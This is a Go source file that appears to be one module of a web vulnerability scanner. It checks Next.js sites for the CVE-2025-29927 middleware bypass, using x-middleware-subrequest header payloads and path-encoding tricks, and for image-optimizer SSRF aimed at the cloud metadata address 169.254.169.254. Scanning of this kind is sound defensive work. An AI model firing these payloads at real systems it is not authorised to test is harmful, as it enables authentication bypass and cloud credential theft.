package modules

import (
	"context"
	"fmt"
	"net/url"
	"strings"
)

var nextjsHeaderPayloads = []struct {
	name  string
	value string
	desc  string
}{
	{
		name:  "x-middleware-subrequest",
		value: "middleware:middleware:middleware:middleware:middleware",
		desc:  "CVE-2025-29927: x-middleware-subrequest recursive middleware bypass",
	},
	{
		name:  "x-middleware-subrequest",
		value: "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
		desc:  "CVE-2025-29927: x-middleware-subrequest src/middleware variant",
	},
}

var nextjsPathTransforms = []struct {
	fn   func(string) string
	desc string
}{
	{fn: func(p string) string { return "/" + p }, desc: "Double leading slash"},
	{fn: func(p string) string { return "/%2e" + p }, desc: "URL-encoded dot prefix"},
	{fn: func(p string) string { return "/en" + p }, desc: "Locale prefix bypass (en)"},
	{fn: func(p string) string { return "/%2e%2e" + p }, desc: "URL-encoded traversal prefix"},
}

func (r *Runner) runNextJSBypass(ctx context.Context, target ScanTarget) []ModuleFinding {
	if ok, reason := r.shouldRunModule("nextjs_bypass", target); !ok {
		r.emitSkip("nextjs_bypass", target, reason)
		return nil
	}

	var out []ModuleFinding
	u, err := url.Parse(target.EndpointURL)
	if err != nil {
		return nil
	}
	origin := u.Scheme + "://" + u.Host

	// Check 1: Next.js Middleware Bypass on 401/403 endpoints
	baselineRR, err := r.cachedEmptyProbe(ctx, target)
	if err == nil && (baselineRR.Response.StatusCode == 401 || baselineRR.Response.StatusCode == 403) {
		// Phase A: Header payloads (CVE-2025-29927)
		for _, hp := range nextjsHeaderPayloads {
			headers := map[string]string{hp.name: hp.value}
			headers = mergeHeaders(headers, r.wafHeadersForModule("nextjs_bypass", target.EndpointURL))
			rr, err := r.client.Do(ctx, target.Method, target.EndpointURL, nil, headers)
			if err != nil || rr.Response.StatusCode != 200 {
				continue
			}

			body := rr.Response.Body
			if isLoginOrErrorBody(body) {
				continue
			}

			// Re-verify that baseline is STILL 401/403 to prevent transient flaps
			baseRe, bErr := r.client.Do(ctx, target.Method, target.EndpointURL, nil, nil)
			if bErr != nil || (baseRe.Response.StatusCode != 401 && baseRe.Response.StatusCode != 403) {
				continue
			}

			// Re-verify bypass request to ensure stability
			reRR, reErr := r.client.Do(ctx, target.Method, target.EndpointURL, nil, headers)
			if reErr != nil || reRR.Response.StatusCode != 200 || isLoginOrErrorBody(reRR.Response.Body) {
				continue
			}

			signal := "middleware_bypass"
			p := defaultPayload("nextjs_bypass", signal, hp.name+": "+hp.value, signal)
			f := r.verifyAndBuild(ctx, "nextjs_bypass", target, p, baselineRR, rr, signal, false, false, "", "")
			if f != nil {
				f.Severity = "critical"
				f.Title = "Next.js Middleware Authentication Bypass (" + hp.desc + ")"
				f.Description = fmt.Sprintf("Next.js middleware authentication/authorization was bypassed on protected route '%s' via '%s: %s' (Original status: %d -> 200).", target.EndpointURL, hp.name, hp.value, baselineRR.Response.StatusCode)
				r.recordFinding(ctx, &out, f, "nextjs_bypass", signal)
				return out
			}
		}

		// Phase B: Path transformations
		for _, pt := range nextjsPathTransforms {
			transformedPath := pt.fn(u.Path)
			transformedURL := origin + transformedPath
			if !r.scope.IsInScope(transformedURL) {
				continue
			}

			rr, err := r.client.Do(ctx, target.Method, transformedURL, nil, nil)
			if err != nil || rr.Response.StatusCode != 200 {
				continue
			}

			body := rr.Response.Body
			if isLoginOrErrorBody(body) {
				continue
			}

			// Catch-all SPA shell check: verify the response is NOT identical to a random 404 path
			random404URL := origin + "/akca-404-" + randomProbeToken()
			r404, rErr := r.client.Do(ctx, "GET", random404URL, nil, nil)
			if rErr == nil && r404.Response.StatusCode == 200 && bodiesSimilar(body, r404.Response.Body) {
				continue
			}

			signal := "middleware_bypass"
			p := defaultPayload("nextjs_bypass", signal, transformedPath, signal)
			f := r.verifyAndBuild(ctx, "nextjs_bypass", target, p, baselineRR, rr, signal, false, false, "", "")
			if f != nil {
				f.Severity = "high"
				f.Title = "Next.js Middleware Path Bypass (" + pt.desc + ")"
				f.Description = fmt.Sprintf("Next.js middleware route protection bypassed via path normalization transformation '%s' (Original status: %d -> 200).", transformedPath, baselineRR.Response.StatusCode)
				r.recordFinding(ctx, &out, f, "nextjs_bypass", signal)
				return out
			}
		}
	}

	// Check 2: Next.js Image Optimizer SSRF
	imageOptimizerURL := origin + "/_next/image?url=https%3A%2F%2Fexample.com&w=256&q=75"
	if r.scope.IsInScope(imageOptimizerURL) {
		optRR, err := r.client.Do(ctx, "GET", imageOptimizerURL, nil, nil)
		if err == nil && optRR.Response.StatusCode != 404 && optRR.Response.StatusCode != 0 {
			// Probe OAST if enabled
			if r.cfg.EnableOAST && r.oast != nil {
				if oastURL := strings.TrimSpace(r.oastURL(ctx, "nextjs-image-ssrf", target, "nextjs_bypass")); oastURL != "" {
					r.sendOASTProbe(ctx, target, oastURL)
					probeURL := origin + "/_next/image?url=" + url.QueryEscape(oastURL) + "&w=256&q=75"
					_, _ = r.client.Do(ctx, "GET", probeURL, nil, nil)
				}
			}

			// In-band cloud metadata probe
			metaURL := "http://169.254.169.254/latest/meta-data/"
			probeURL := origin + "/_next/image?url=" + url.QueryEscape(metaURL) + "&w=256&q=75"
			metaRR, mErr := r.client.Do(ctx, "GET", probeURL, nil, nil)
			if mErr == nil && metaRR.Response.StatusCode == 200 {
				body := metaRR.Response.Body
				if strings.Contains(body, "ami-id") || strings.Contains(body, "instance-id") || strings.Contains(body, "local-hostname") {
					signal := "image_ssrf"
					p := defaultPayload("nextjs_bypass", signal, metaURL, signal)
					f := r.verifyAndBuild(ctx, "nextjs_bypass", target, p, optRR, metaRR, signal, false, false, "", "")
					if f != nil {
						f.Severity = "critical"
						f.Title = "Next.js Image Optimizer Cloud Metadata SSRF"
						f.Description = "The Next.js image optimization endpoint /_next/image allows unauthenticated server-side requests to AWS/cloud instance metadata."
						r.recordFinding(ctx, &out, f, "nextjs_bypass", signal)
					}
				}
			}
		}
	}

	return out
}

func isLoginOrErrorBody(body string) bool {
	lower := strings.ToLower(body)
	if strings.Contains(lower, "sign in") || strings.Contains(lower, "login") ||
		strings.Contains(lower, "log in") || strings.Contains(lower, "password") && strings.Contains(lower, "type=\"password\"") {
		return true
	}
	if strings.Contains(lower, "page not found") || strings.Contains(lower, "404 not found") ||
		strings.Contains(lower, "access denied") || strings.Contains(lower, "unauthorized") {
		return true
	}
	return false
}

func nextJSBypassSignalConfirmed(signal, body string, probeStatus, baseStatus int) bool {
	if probeStatus != 200 {
		return false
	}
	switch signal {
	case "middleware_bypass":
		return (baseStatus == 401 || baseStatus == 403) &&
			len(strings.TrimSpace(body)) >= 20 &&
			!isLoginOrErrorBody(body)
	case "image_ssrf":
		return strings.Contains(body, "ami-id") ||
			strings.Contains(body, "instance-id") ||
			strings.Contains(body, "local-hostname")
	default:
		return false
	}
}
